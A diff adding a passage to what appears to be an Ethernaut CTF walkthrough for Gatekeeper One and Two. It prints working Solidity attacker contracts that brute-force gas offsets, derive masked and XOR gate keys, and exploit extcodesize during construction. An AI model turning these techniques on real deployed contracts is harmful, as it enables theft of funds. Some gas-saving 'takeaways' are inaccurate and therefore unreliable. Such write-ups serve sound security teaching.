@@ -1103,7 +1103,304 @@ Useful links:
 - Solidity [opcode](https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2) basics
 - [Explicit Conversion](https://docs.soliditylang.org/en/v0.8.3/types.html#explicit-conversions) between types
 
+We start with following `GatePassOne` to attack:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+contract GatePassOne {
+    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
+        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)));
+        (bool success, ) = address(_gateAddr).call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
+        return success;
+    }
+}
+```
+
+**gateOne**
+
+This is exactly same as level 4. A basic intermediary contract will be used to call `enter`, so that `msg.sender` != `tx.origin`.
+
+**gateTwo**
+
+According to the contract, the remaining gas just after `gasleft` is called, should be a multiple of 8191. We can control the gas amount sent with transaction using `call`. But it need to be set in such a way that amount set minus amount used up until `gasleft`'s return should be a multiple of 8191.
+
+I'm going to use Remix's Debug feature and a little bit of trial & error to determine the remaining gas up until to that point. But first copy & deploy `GatekeeperOne` in Remix with `JavaScript VM` environment (since trials are quick & Debug on testnet didn't work on Remix for me!), with same solidity compiler version. Also deploy `GateKeeperOneGasEstimate` with same environment, to help with estimating gas used up to that point:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+contract GateKeeperOneGasEstimate {
+    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
+        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)));
+        (bool success, ) = address(_gateAddr).call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
+        return success;
+    }
+}
+```
+
+Initially choose a random fixed gas amount (but big enough) to send with transaction. Let's say `90000`. And call `enterGate` of `GateKeeperOneGasEstimate` with address of our deployed `GatekeeperOne` (from Remix, not Ethernaut's!) and the chosen gas. Now hit `Debug` button in Remix console against the mined transaction. Focus on left pane.
+
+See the list of opcodes executed corresponding to our contract execution. Step over (or drag progress bar) until the line with `gasleft` is highlighted:
+
+```
+289 JUMPDEST
+290 PUSH1 ..
+292 PUSH2 ..
+295 GAS
+296 PUSH2
+   .
+   .
+   .
+139 RETURN
+```
+
+Step here and there to locate the `GAS` opcode which corresponds to `gasleft` call. Proceed just one step more (to `PUSH2` here) and note the "remaining gas" from **Step Detail** just below. In my case it's `89746`. Hence gas used up to that point:
+
+```
+gasUsed = _gas - remaining_gas
+or, gasUsed = 90000 - 89746
+or, gasUsed = 254
+```
+
+Now, we have `gasUsed` and we want set a `_gas` such that `gasLeft` returns a multiple of 8191. One such value would be:
+
+```
+_gas = (8191 * 8) + gasUsed
+or, _gas = (8191 * 8) + 254
+or, _gas = 65782
+```
+
+(Note that I randomly chose `8` to multiply to 8191, you can choose any as log as sufficient gas is provided for transaction)
+
+So `_gas` should probably be `65782` to pass the check. But, the target `GateKeeperOne` contract (Ethernaut's instance) on Rinkeby network must've had a little bit of different compile time options. So correct `_gas` is not necessarily `65782`, but a close one. Let's pick a reasonable margin around `65782` and call `enter` for all values around `65782` with that margin. A margin of `64` worked for me. Let's update `GatePassOne`:
+
+```solidity
+contract GatePassOne {
+    event Entered(bool success);
+
+    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
+        bytes8 key = bytes8(uint64(uint160(tx.origin)));
+
+        bool succeeded = false;
+
+        for (uint i = _gas - 64; i < _gas + 64; i++) {
+          (bool success, ) = address(_gateAddr).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
+          if (success) {
+            succeeded = success;
+            break;
+          }
+        }
+
+        emit Entered(succeeded);
+
+        return succeeded;
+    }
+}
+```
+
+Calling `enterGate` with `GateKeeper` address and `65782`, params should now clear `gateTwo`.
+
+**gateThree**
+
+This has checks that involves explicit conversions between `uint`s. It can be inferred from third `require` statement that the `_gateKey` should be extracted from `tx.origin` through casting while satisfying other checks.
+
+`tx.origin` will be the `player` which in my case is:
+
+`0xd557a44ed144bf8a3da34ba058708d1b4bc0686a`
+
+We should be concerned with only 8 bytes of it since `_gateKey` is `bytes8` (8 byte size) type. And specifically last 8 bytes of it, **since `uint` conversions retain the last bytes.**
+
+![](https://miro.medium.com/max/1400/1*iaHciYKXtdk4-Z9tGaiknw.png)
+
+So, 8 bytes portion (say, `key`) of our interest: `key = 58 70 8d 1b 4b c0 68 6a`
+
+Accordingly, `uint32(uint64(key)) = 4b c0 68 6a`.
+
+To satisfy third `require`, it is needed that:
+
+```solidity
+uint32(uint64(key)) == uint16(tx.origin)
+or, 4b c0 68 6a = 68 6a
+```
+
+which is only possible by masking with `00 00 ff ff` , such that: `4b c0 68 6a & 00 00 ff ff = 68 6a`
+
+The first `require` is satisfied by:
+
+```solidity
+uint32(uint64(_gateKey)) == uint16(uint64(key)
+or, 4b c0 68 6a = 68 6a
+```
+
+which is same problem as previous one and can be achieved with same, previous value of `mask`.
+
+The second `require` asks to satisfy:
+
+```solidity
+uint32(uint64(key)) != uint64(key)
+or, 4b c0 68 6a != 58 70 8d 1b 4b c0 68 6a
+```
+
+We modify the mask to: `mask = ff ff ff ff 00 00 ff ff`
+
+so that it satisfies: `00 00 00 00 4b c0 68 6a & ff ff ff ff 00 00 ff ff != 58 70 8d 1b 4b c0 68 6a` while also satisfying other two requires.
+
+Hence the \_gateKey should be:
+
+```solidity
+_gateKey = key & mask
+or, _gateKey = 58 70 8d 1b 4b c0 68 6a & ff ff ff ff 00 00 ff ff
+```
+
+Finally, update `GatePassOne` to reflect it.
+
+```solidity
+contract GatePassOne {
+    event Entered(bool success);
+
+    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
+        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
+
+        bool succeeded = false;
+
+        for (uint i = _gas - 64; i < _gas + 64; i++) {
+          (bool success, ) = address(_gateAddr).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
+          if (success) {
+            succeeded = success;
+            break;
+          }
+        }
+
+        emit Entered(succeeded);
+
+        return succeeded;
+    }
+}
+```
+
+**_Key Security Takeaways_**
+
+- Abstain from asserting gas consumption in your smart contracts, as different compiler settings will yield different results.
+- Be careful about data corruption when converting data types into different sizes.
+- **Save gas** by not storing unnecessary values. Pushing a value to state `MSTORE`, `MLOAD` is always **less gas intensive than** store values to the blockchain with `SSTORE`, `SLOAD`
+- **Save gas** by using appropriate modifiers to get functions calls for free, i.e. `external pure` or `external view` function calls are free!
+- **Save gas** by masking values (less operations), rather than typecasting
+
 ### Level 14. Gatekeeper Two
+
+**Goal**: `player` has to set itself as `entrant`, like the previous level.
+
+Given Contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller()) }
+    require(x == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+```
+
+**gateOne**
+
+This is exactly same as level 4. An intermediary contract (`GatePassTwo` here) will be used to call `enter`, so that `msg.sender` != `tx.origin`.
+
+**gateTwo**
+
+Second check involves solidity assembly code - specifically `caller` and `extcodesize` functions. `caller()` is nothing but sender of message i.e. `msg.sender` which will be address of `GatePassTwo`.
+`extcodesize(addr)` returns the size of contract at address `addr`. So, `x` is assigned the size of the contract at `msg.sender` address. But size of a contract is always going to be non-zero. And to pass check, `x` must zero!
+
+Here's the trick. See the footer note of [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) on page 11:
+
+_"During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account..."_
+
+During creation/initialization of the contract the `extcodesize()` returns 0. So we're going to put the malicious code in `constructor` itself. Since it is the `constructor` that runs during initialization, any calls to `extcodesize()` will return 0. Update `GatePassTwo` accordingly (ignore `key` for now):
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract GatePassTwo {
+    constructor(address _gateAddr) public {
+        bytes8 key = bytes8(uint64(address(this)));
+        address(_gateAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
+    }
+}
+```
+
+This will pass `gateTwo`.
+
+**gateThree**
+Third check is basically some manipulation with ^ XOR operator.
+
+As is visible from the equality check:
+
+```solidity
+uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
+```
+
+`_gateKey` must be derived from `msg.sender` (in `GatekeeperTwo`), which is same as `address(this)` in our `GatePassTwo`.
+
+The `uint64(0) - 1` on RHS is max value of `uint64` integer (due to **underflow**). Hence, in hex representation: `uint64(0) - 1 = 0xffffffffffffffff`
+
+By nature of XOR operation:
+`If, X ^ Y = Z Then, Y = X ^ Z`
+
+Using this XOR property, it can be deduced that:
+
+```solidity
+uint64(_gateKey) == uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff)
+```
+
+So, correct `key` can be calculated in solidity as:
+
+```solidity
+bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff))
+```
+
+Final update to `GatePassTwo`:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract GatePassTwo {
+    constructor(address _gateAddr) public {
+        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff));
+        address(_gateAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
+    }
+}
+```
+
+**_Key Security Takeaways_**
+
+- In addition to [contract blackholes](https://medium.com/coinmonks/ethernaut-lvl-7-walkthrough-how-to-selfdestruct-and-create-an-ether-blackhole-eb5bb72d2c57), you can also create Zombie contracts by stopping contract initialization. The resulting contract has an address, but permanently no code, and will never be able to return you the initial **endowment**.
 
 ### Level 15. Naught Coin
 
